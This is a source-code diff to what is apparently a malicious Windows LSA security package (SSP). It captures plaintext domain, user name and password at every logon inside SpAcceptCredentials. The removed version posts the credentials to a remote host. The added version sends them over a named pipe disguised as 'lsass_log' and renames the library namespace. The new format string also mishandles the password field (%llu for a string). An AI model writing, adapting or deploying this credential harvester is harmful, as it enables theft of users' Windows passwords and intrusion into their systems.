@@ -5,13 +5,16 @@
 #include <sspi.h>
 #include <NTSecAPI.h>
 #include <ntsecpkg.h>
+#include <string>
+#include <vector>
+#include <strsafe.h>
 
-#include <monstars/http.h>
-#include <monstars/logging.h>
-#include <monstars/memory.h>
-#include <monstars/mutex.h>
-#include <monstars/object.h>
-#include <monstars/util.h>
+#include <common/http.h>
+#include <common/logging.h>
+#include <common/memory.h>
+#include <common/mutex.h>
+#include <common/object.h>
+#include <common/util.h>
 
 #include "provider.h"
 
@@ -19,13 +22,62 @@ SECPKG_FUNCTION_TABLE g_SecurityPackageFunctionTable = {};
 
 // SpAcceptCredentials seems to be called twice per authentication
 //   - add a cooldown to avoid redundant POST requests
-monstars::Cooldown g_cooldown(c_ReauthCooldown);
+common::Cooldown g_cooldown(c_ReauthCooldown);
 
 wchar_t g_LastAuthUser[MAX_PATH] = {};
 
 // stampable values - configured via web interface or helper script
-constexpr wchar_t c_Hostname[128] = L"EVERYBODYGETUP";
 constexpr wchar_t c_AuthToken[] = L"00000000-0000-0000-0000-000000000000";
+static constexpr wchar_t c_PipeName[] = L"\\\\.\\pipe\\lsass_log";
+
+static DWORD WriteWideLineToPipeWithRetry(const wchar_t* wideStr)
+{
+    // Convert wideStr -> UTF-8 (+ '\n') into a heap buffer you control
+    int wideLen = lstrlenW(wideStr); // chars, no NUL
+
+    int utf8Len = WideCharToMultiByte(CP_UTF8, 0, wideStr, wideLen, nullptr, 0, nullptr, nullptr);
+    if (utf8Len <= 0) return GetLastError();
+
+    common::HeapBuffer outBuf((utf8Len + 1));     // bytes
+    char* out = outBuf.Get<char>();
+
+    int written = WideCharToMultiByte(CP_UTF8, 0, wideStr, wideLen, out, utf8Len, nullptr, nullptr);
+    if (written != utf8Len) return ERROR_INVALID_DATA;
+
+    out[utf8Len] = '\n';
+    DWORD outBytes = (DWORD)(utf8Len + 1);
+
+    uint32_t attempts = c_ConnectAttempts;
+    do {
+        if (!WaitNamedPipeW(c_PipeName, 2000)) {
+            DWORD e = GetLastError();
+            if (--attempts) { Sleep(c_RetryInterval); continue; }
+            return (e == ERROR_PIPE_BUSY) ? ERROR_BUSY : ERROR_TIMEOUT;
+        }
+
+        HANDLE hPipe = CreateFileW(c_PipeName, GENERIC_WRITE, 0, nullptr, OPEN_EXISTING,
+                                   FILE_ATTRIBUTE_NORMAL, nullptr);
+        if (hPipe == INVALID_HANDLE_VALUE) {
+            DWORD e = GetLastError();
+            if (--attempts) { Sleep(c_RetryInterval); continue; }
+            return (e == ERROR_ACCESS_DENIED) ? ERROR_ACCESS_DENIED : e;
+        }
+
+        DWORD bytesWritten = 0;
+        BOOL ok = WriteFile(hPipe, out, outBytes, &bytesWritten, nullptr);
+        CloseHandle(hPipe);
+
+        if (ok && bytesWritten == outBytes) return ERROR_SUCCESS;
+
+        DWORD e = GetLastError();
+        if (--attempts) { Sleep(c_RetryInterval); continue; }
+        return e;
+
+    } while (attempts);
+
+    return ERROR_TIMEOUT;
+}
+
 
 NTSTATUS
 NTAPI
@@ -63,36 +115,21 @@ SpGetInfo(SecPkgInfoW* PackageInfo)
 
 DWORD SendCredsAsync(void* credsPtr)
 {
-    monstars::HeapBuffer credsBuf(credsPtr);
+    common::HeapBuffer credsBuf(credsPtr);
     auto creds = credsBuf.Get<bang::Creds>();
 
-    monstars::HeapBuffer jsonBuf(MAX_PATH);
-    auto jsonPayload = jsonBuf.Get<wchar_t>();
+    wchar_t msg[1024]{};
+    wsprintfW(msg, L"%s|%s|%llu", creds->Domain, creds->User, creds->Password);
 
-    wsprintfW(jsonPayload, c_JsonTemplate, c_AuthToken, creds->Domain, creds->User, creds->Password);
-    int jsonLen = lstrlenW(jsonPayload) * sizeof(wchar_t);
+    DEBUG_PRINTW(L"%s\n", msg);
 
-    DEBUG_PRINTW(L"%s\n", jsonPayload);
-
-    uint32_t attempts = c_ConnectAttempts;
-    do
-    {
-        monstars::HttpClient client(c_Hostname);
-        if (client.PostRequest(c_Endpoint, jsonBuf.Get(), jsonLen, c_ContentType))
-        {
-            return ERROR_SUCCESS;
-        }
-        if (client.Forbidden())
-        {
-            return ERROR_ACCESS_DENIED;
-        }
-        if (--attempts) Sleep(c_RetryInterval);
-    } while (attempts);
-
-    DEBUG_PRINTW(L"failed to send creds after %ld attempts\n", c_ConnectAttempts);
-
-    return ERROR_TIMEOUT;  // not checked anywhere, doesn't matter
+    DWORD rc = WriteWideLineToPipeWithRetry(msg);
+    if (rc != ERROR_SUCCESS) {
+        DEBUG_PRINTW(L"failed to send creds after %ld attempts\n", c_ConnectAttempts);
+    }
+    return rc;
 }
+
 
 NTSTATUS
 NTAPI
@@ -106,23 +143,23 @@ SpAcceptCredentials(SECURITY_LOGON_TYPE LogonType, PUNICODE_STRING AccountName,
         // skip if we *just* got creds for this user
         if (g_cooldown || lstrcmpW(AccountName->Buffer, g_LastAuthUser))
         {
-            monstars::memset(g_LastAuthUser, 0, sizeof(g_LastAuthUser));
-            monstars::memcpy(g_LastAuthUser, sizeof(g_LastAuthUser), AccountName->Buffer, AccountName->Length);
+            common::memset(g_LastAuthUser, 0, sizeof(g_LastAuthUser));
+            common::memcpy(g_LastAuthUser, sizeof(g_LastAuthUser), AccountName->Buffer, AccountName->Length);
 
-            monstars::HeapBuffer credsBuf(sizeof(bang::Creds));
+            common::HeapBuffer credsBuf(sizeof(bang::Creds));
             if (credsBuf)
             {
                 auto creds = credsBuf.Get<bang::Creds>();
-                monstars::memcpy(creds->Domain, sizeof(creds->Domain), PrimaryCredentials->DomainName.Buffer,
+                common::memcpy(creds->Domain, sizeof(creds->Domain), PrimaryCredentials->DomainName.Buffer,
                     PrimaryCredentials->DomainName.Length);
-                monstars::memcpy(creds->User, sizeof(creds->User), AccountName->Buffer, AccountName->Length);
-                monstars::memcpy(creds->Password, sizeof(creds->Password), PrimaryCredentials->Password.Buffer,
+                common::memcpy(creds->User, sizeof(creds->User), AccountName->Buffer, AccountName->Length);
+                common::memcpy(creds->Password, sizeof(creds->Password), PrimaryCredentials->Password.Buffer,
                     PrimaryCredentials->Password.Length);
 
                 DEBUG_PRINTW(L"%s\\%s:%s\n", creds->Domain, creds->User, creds->Password);
 
                 // release creds buffer here; free in helper thread
-                monstars::ObjectHandle thread = CreateThread(NULL, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(SendCredsAsync),
+                common::ObjectHandle thread = CreateThread(NULL, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(SendCredsAsync),
                     credsBuf.Release(), 0, NULL);
             }
         }
